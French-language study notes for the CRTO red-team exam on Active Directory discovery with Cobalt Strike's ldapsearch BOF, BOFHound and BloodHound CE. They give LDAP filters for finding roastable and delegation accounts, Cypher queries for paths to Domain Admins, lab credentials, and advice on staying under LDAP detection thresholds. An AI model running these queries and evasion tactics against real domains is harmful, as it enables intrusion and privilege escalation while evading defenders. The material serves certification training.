# Discovery — Reconnaissance Active Directory

> Après **Credential Access** et **User Impersonation**, la phase de **Discovery** permet d’identifier les groupes et les accès administrateur locaux sur les machines du domaine.
> Objectif : cartographier les chemins d’attaque tout en limitant les requêtes LDAP susceptibles de déclencher des détections.

- Lightweight Directory Access Protocol (**LDAP**)
- BOFHound → BloodHound CE

---

## Pourquoi éviter les collectors par défaut ?

| Collector | Risque de détection |
|-----------|---------------|
| SharpHound | Requêtes LDAP caractéristiques, énumération des sessions et collecte AD volumineuse ; détectables par une Blue Team équipée |
| AzureHound | Risques similaires dans Entra ID |
| ldapsearch BOF + BOFHound | Requêtes ciblées et cadence maîtrisée ; approche privilégiée dans les notes CRTO |

**Méthode CRTO :** `ldapsearch` BOF → copie des logs → `bofhound` → import des JSON dans BloodHound CE.

---

## Filtres LDAP — Référence rapide

| Type d’objet | samAccountType / filtre |
|-------------|------------------------|
| Utilisateurs | `samAccountType=805306368` |
| Ordinateurs | `samAccountType=805306369` |
| Groupes | `samAccountType=268435456` |
| Domain | `objectClass=domain` |
| OUs | `objectClass=organizationalUnit` |
| GPOs | `objectClass=groupPolicyContainer` |
| Trusts | `objectClass=trustedDomain` |
| Filtres WMI | `objectClass=msWMI-Som` |

> **Attention :** les comptes ordinateurs possèdent aussi les valeurs `user` et `person` dans `objectClass`. Un filtre `objectClass=user` peut donc renvoyer des ordinateurs ; utiliser `samAccountType=805306369` pour ne cibler que ces derniers.

---

## OPSEC — Seuils de détection LDAP

```
Expensive Search Results   — query returns more results than threshold (avoid objectClass=* dumps)
Search Time Threshold      — query takes too long; * attributes + large result = slow
Inefficient Search Results — returns <10% of visited objects if visited >threshold
                             e.g. kerberoast SPN filter visits ALL users, returns few → inefficient
```

**Approche recommandée dans ces notes :** utiliser des requêtes courtes et ciblées, réparties sur plusieurs sessions.
Limiter les attributs renvoyés avec `--attributes` et éviter `*`, sauf lorsque les données ACL l’exigent.

---

## Étape 1 — Énumération LDAP avec le BOF `ldapsearch`

### Énumération principale du domaine (OPSEC-SAFE)

```cs
// Domain, OUs, GPOs — with ACL data for BloodHound edges
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor

// Users, computers, groups — with ACL data
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

> `ntsecuritydescriptor` contient les ACL des objets. Ces données permettent à BloodHound de représenter les chemins liés aux permissions (`GenericWrite`, `WriteDacl`, etc.). BOFHound décode leur sortie en Base64.

### Requêtes ciblées

```cs
// All users — minimal attributes (fast, efficient)
beacon> ldapsearch (samAccountType=805306368) --attributes samaccountname,memberof,admincount,description,useraccountcontrol

// All computers
beacon> ldapsearch (samAccountType=805306369) --attributes dnshostname,operatingsystem,ms-mcs-admpwd

// All groups
beacon> ldapsearch (samAccountType=268435456) --attributes samaccountname,member,admincount

// Privileged accounts (adminCount=1)
beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes samaccountname,memberof

// Kerberoastable accounts (SPN set, not krbtgt, not disabled)
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samaccountname,serviceprincipalname

// AS-REP roastable (preauth disabled)
beacon> ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samaccountname

// Unconstrained delegation — computers (TRUSTED_FOR_DELEGATION flag = 524288)
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes dnshostname,samaccountname

// Constrained delegation
beacon> ldapsearch (&(samAccountType=805306368)(msds-allowedtodelegateto=*)) --attributes samaccountname,msds-allowedtodelegateto

// Domain trusts
beacon> ldapsearch (objectClass=trustedDomain) --attributes *

// WMI filters (check before assuming GPO applies to all computers in OU)
beacon> ldapsearch (objectClass=msWMI-Som) --attributes msWMI-Name,msWMI-Parm2

// Specific object by SID (fill in gaps after initial BloodHound ingest)
beacon> ldapsearch (objectSid=S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX) --attributes *
```

### Syntaxe des filtres bitwise

```
userAccountControl flags:
  524288   = TRUSTED_FOR_DELEGATION (unconstrained)
  4194304  = DONT_REQ_PREAUTH (AS-REP roastable)
  2        = ACCOUNTDISABLE

Syntax: (attr:1.2.840.113556.1.4.803:=<value>)   ← bitwise AND
```

### Appartenance aux groupes imbriqués (LDAP_MATCHING_RULE_IN_CHAIN)

```cs
// Unroll all ancestors of Domain Admins — avoids manual recursive group lookups
beacon> ldapsearch (memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=contoso,DC=com) --attributes samaccountname
```

---

## Étape 2 — Copier les logs Beacon sur l’Attacker Desktop

```bash
# On attacker desktop — open Ubuntu tab in Windows Terminal
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
# Password: Passw0rd!
```

---

## Étape 3 — Analyser les logs avec BOFHound

```bash
bofhound -i logs
# Outputs BloodHound-compatible JSON files to current directory
```

---

## Étape 4 — Importer les données dans BloodHound CE

```
1. Start Menu → Docker Desktop → Containers → play all containers
2. Edge → http://localhost:8080/ui/login
   Credentials: admin : eA%N4frBrnn2  (or autofilled)
3. First login → 'start by uploading your data'
4. Upload File(s) → select JSON files from C:\Users\Attacker\Desktop\
5. Wait for status: Complete
6. Explore → Cypher search box
```

### Requêtes Cypher utiles dans BloodHound

```cypher
// All GPOs
MATCH (n:GPO) RETURN n

// All kerberoastable users
MATCH (n:User) WHERE n.hasspn=true RETURN n

// Shortest path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@CONTOSO.COM"})) RETURN p

// Find users with local admin paths
MATCH p=(n:User)-[r:AdminTo]->(m:Computer) RETURN p

// Users with DCSync rights
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(m:Domain) RETURN p
```

---

## Étape 5 — Restricted Groups (administrateurs locaux via GPO)

> LDAP seul ne révèle pas toutes les appartenances aux groupes locaux appliquées par GPO.
> Lire `GptTmpl.inf` dans SYSVOL pour identifier les relations groupe → administrateur local d’ordinateur.

```cs
// Step 1 — find GPO gPCFileSysPath in BloodHound (e.g. Workstation Admins GPO)
// Note the GUID from Gpcpath field in BloodHound node properties

// Step 2 — list and download the policy file from SYSVOL
beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{GPO-GUID}\Machine\Microsoft\Windows NT\SecEdit\
beacon> download \\contoso.com\SysVol\contoso.com\Policies\{GPO-GUID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

// Step 3 — sync download: CS GUI → View → Downloads
// Step 4 — open GptTmpl.inf in Notepad/VSCode
//   Find [Group Membership] section — note the domain group SID
//   *S-1-5-32-544__Members = <domain-group-SID>   ← S-1-5-32-544 = built-in Administrators
```

### Ajouter manuellement les relations manquantes à BloodHound

```cypher
// Template — replace Computer and Group objectids with values from BloodHound/GptTmpl.inf
MATCH (x:Computer{objectid:'S-1-5-21-DOMAIN-SID-COMPUTER-RID'})
MATCH (y:Group{objectid:'S-1-5-21-DOMAIN-SID-GROUP-RID'})
MERGE (y)-[:AdminTo]->(x)
```

```cypher
// Lab example — rsteel's group has AdminTo on WKSTN-1 and WKSTN-2
MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)

MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)
```

---

## WMI Filters — Points à vérifier pour l’examen

> Les **WMI filters** peuvent restreindre l’application d’une GPO, même dans une OU liée. BloodHound ne les évalue pas.
> Une GPO peut sembler s’appliquer à un ordinateur selon son OU, mais un WMI filter peut l’exclure.

```cs
// Enumerate WMI filters
beacon> ldapsearch (objectClass=msWMI-Som) --attributes msWMI-Name,msWMI-Parm2

// Check if a GPO has a WMI filter applied — look for 'gPCWQLFilter' attribute
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gpcfilesyspath,gpcwqlfilter
```

> Si `gpcwqlfilter` est renseigné sur une GPO, celle-ci possède un WMI filter : vérifier la requête
> avant de conclure qu’elle s’applique à tous les ordinateurs de l’OU liée.
> Relation GPO/WMI filter : une GPO possède au plus un filtre, tandis qu’un filtre peut être utilisé par plusieurs GPO.

---

## Checklist pour l’examen

```
1. Immediately after beacon — run core ldapsearch queries (domain + users/computers/groups)
   beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
   beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

2. Copy CS logs to attacker desktop
   cd /mnt/c/Users/Attacker/Desktop && scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .

3. Parse with BOFHound
   bofhound -i logs

4. Start BloodHound CE (Docker Desktop) → ingest JSON files

5. Run Cypher queries — identify:
   - Kerberoastable / AS-REP roastable accounts
   - Shortest path to DA
   - Local admin paths
   - ACL abuse paths (GenericWrite, WriteDacl, GenericAll)

6. For any node showing 'no local admins' — check linked GPOs
   → Find gPCFileSysPath → download GptTmpl.inf from SYSVOL → add AdminTo edges manually

7. Check WMI filters on GPOs before assuming scope

8. Fill in BloodHound gaps — query unknown SIDs individually
   beacon> ldapsearch (objectSid=<SID>) --attributes *
```

---

## Récapitulatif OPSEC

```
Tier:          SAFE
Spawns proc:   No — ldapsearch BOF runs in beacon thread (inline-execute)
Touches LSASS: No
Writes disk:   No — output stays in beacon console / CS logs
Event logs:    LDAP queries logged client-side via LDAP Client ETW, server-side perf events
EDR telemetry: LDAP traffic to DC on port 389 — expected from domain-joined hosts
Defender sig:  ldapsearch BOF is not signatured like SharpHound hardcoded queries
─────────────────────────────────────────────────
Avoid: SharpHound default collection — signatured + noisy session enumeration
Avoid: objectClass=* wildcard dumps — trips expensive search results threshold
Avoid: returning * attributes on large result sets — trips search time threshold
Safe:  targeted attribute lists, split queries across sessions, use indexed attributes
```
